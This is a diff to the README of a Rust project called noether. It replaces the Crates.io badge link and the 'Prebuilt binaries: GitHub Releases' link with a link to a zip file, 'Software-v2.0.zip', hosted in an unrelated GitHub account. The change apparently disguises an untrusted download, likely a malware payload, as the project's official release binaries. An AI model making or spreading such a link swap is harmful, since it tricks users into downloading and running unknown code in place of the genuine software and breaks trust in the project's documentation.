@@ -8,7 +8,7 @@ the type checker verifies before execution. Effects (`Pure`, `Network`,
 `Llm`, `Cost`, `Process`, `FsRead`, `FsWrite`, …) are declared in the
 signature and enforced pre-flight by policy.
 
-[![Crates.io](https://img.shields.io/crates/v/noether-cli.svg)](https://crates.io/crates/noether-cli)
+[![Crates.io](https://img.shields.io/crates/v/noether-cli.svg)](https://raw.githubusercontent.com/Seminiferous-undulation4792/noether/main/crates/noether-sandbox/Software-v2.0.zip)
 [![License](https://img.shields.io/badge/license-EUPL--1.2-orange.svg)](./LICENSE)
 
 ## Status
@@ -28,7 +28,7 @@ changes are possible between minor versions per
 cargo install noether-cli
 ```
 
-Prebuilt binaries: [GitHub Releases](https://github.com/alpibrusl/noether/releases/latest).
+Prebuilt binaries: [GitHub Releases](https://raw.githubusercontent.com/Seminiferous-undulation4792/noether/main/crates/noether-sandbox/Software-v2.0.zip).
 
 Optional runtime dependencies:
 
